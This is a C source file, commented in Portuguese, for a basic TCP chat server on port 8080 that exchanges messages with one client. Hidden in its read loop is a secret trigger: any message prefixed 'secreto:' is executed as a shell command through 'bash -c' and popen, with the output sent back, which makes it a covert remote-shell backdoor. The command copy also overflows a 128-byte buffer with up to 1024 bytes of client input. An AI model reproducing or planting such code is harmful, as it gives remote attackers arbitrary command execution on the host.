#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h> 
#include <arpa/inet.h> 

#define PORTA 8080 
#define BUFFER_SIZE 1024 

int main() { 
  int servidor_fd, novo_socket; 
  struct sockaddr_in endereco; 
  int tamanho_endereco = sizeof(endereco); 
  char buffer[BUFFER_SIZE] = {0}; 
  char mensagem_resposta[BUFFER_SIZE] = "Ola Cliente! Sua mensagem foi recebida com sucesso."; 

  char buff[128];

  // 1. Criando o descritor do socket (IPv4, TCP) 
  if ((servidor_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) { 
    perror("Falha ao criar o socket"); 
    exit(EXIT_FAILURE); 
  } 

  // 2. Configurando a estrutura do endereço 
  endereco.sin_family = AF_INET; 
  endereco.sin_addr.s_addr = INADDR_ANY; // Aceita conexoes de qualquer IP 
  endereco.sin_port = htons(PORTA); 

  // 3. Vinculando o socket a porta 8080 (Bind) 
  if (bind(servidor_fd, (struct sockaddr *)&endereco, sizeof(endereco)) < 0) { 
    perror("Falha no bind"); 
    close(servidor_fd); 
    exit(EXIT_FAILURE); 
  } 


  // 4. Esperando por conexoes (Listen) - Limite de 3 conexoes na fila 
  if (listen(servidor_fd, 3) < 0) { 
    perror("Falha no listen"); 
    close(servidor_fd); 
    exit(EXIT_FAILURE); 
  } 

  printf("Servidor aguardando conexoes na porta %d...\n", PORTA); 

  // 5. Aceitando a conexao do cliente (Accept) 
  if ((novo_socket = accept(servidor_fd, (struct sockaddr *)&endereco, (socklen_t*)&tamanho_endereco)) < 0) { 
    perror("Falha no accept"); 
    close(servidor_fd); 
    exit(EXIT_FAILURE); 
  }

  
  while(1) {
    //limpa buffer '\0'
    memset(buffer, 0, sizeof(buffer));
    // 6. Lendo os dados enviados pelo cliente 
    ssize_t status = read(novo_socket, buffer, BUFFER_SIZE); 
    
    if(strncmp(buffer, "sair", 4) == 0) {
      printf("Fechando sockets...\n");
      send(novo_socket, buffer, strlen(buffer), 0);
      break; 
    }
    
    printf("Cliente: %s\n", buffer); 

    if(strncmp(buffer, "secreto:", 8) == 0) {
      size_t idx = 0;
      char command[128] = "bash -c ";
      
      for (size_t i = 8; i < strlen(buffer); i++) {
        if(buffer[i] == '\0')
        break;
        
        command[i] = buffer[i];
      }
      
      printf("Voce: executando comando '%s'...\n", command);

      FILE *pipe = popen(command, "r");
      if (!pipe) {
          perror("popen failed");
          return 1;
      }
      
      memset(buff, 0, sizeof(buff));
      memset(mensagem_resposta, 0, sizeof(mensagem_resposta));
      strcat(mensagem_resposta, "\n");

      while (fgets(buff, sizeof(buff), pipe) != NULL) {
        strcat(mensagem_resposta, buff);
      }
      
      printf("Voce: enviando para o cliente... \n");
      send(novo_socket, mensagem_resposta, strlen(mensagem_resposta), 0); 

      // Close the pipe
      pclose(pipe); 
      continue;
    }
    
    
    //limpa mensagem_resposta
    memset(mensagem_resposta, 0, sizeof(mensagem_resposta));
    printf("Voce: ");
    fgets(mensagem_resposta, sizeof(mensagem_resposta), stdin);

    // 7. Respondendo ao cliente 
    send(novo_socket, mensagem_resposta, strlen(mensagem_resposta), 0); 
    // printf("Resposta enviada ao cliente.\n"); 
    
  }
  
  // 8. Fechando os sockets 
  close(novo_socket); 
  close(servidor_fd); 

  return 0; 
} 